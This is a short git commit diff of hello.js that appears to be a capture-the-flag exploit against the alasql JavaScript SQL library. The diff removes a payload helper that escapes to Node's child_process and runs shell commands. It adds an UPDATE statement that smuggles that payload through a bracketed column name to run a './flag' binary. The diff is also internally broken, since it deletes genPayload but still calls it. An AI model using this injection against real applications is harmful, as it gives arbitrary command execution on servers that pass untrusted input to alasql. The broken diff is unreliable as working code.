67f539cbb77723b4ffed9453174a6551665f1296
Massy-J1 <jyc0x09@gmail.com>
2026-04-01 02:22:35 +0900

    Update hello.js

--- hello.js
+++ hello.js
@@ -11,16 +11,5 @@ res = alasql(
     // Initialize the database
     'CREATE table i_am_a_table;' +
     `INSERT INTO i_am_a_table VALUES (1337);` +
-
-    const genPayload = command => `
-(() => {
-  const req = new Function('return this.process.mainModule.require')();
-  const out = req('child_process').execSync(
-    ${JSON.stringify(command)},
-    { encoding: 'utf8' }
-  );
-  throw new Error(out.trim());
-})()
-`;
-
+    `UPDATE i_am_a_table SET [0'+${genPayload("chmod +x ./flag && ./flag 2>&1")}+']=42;`
 );
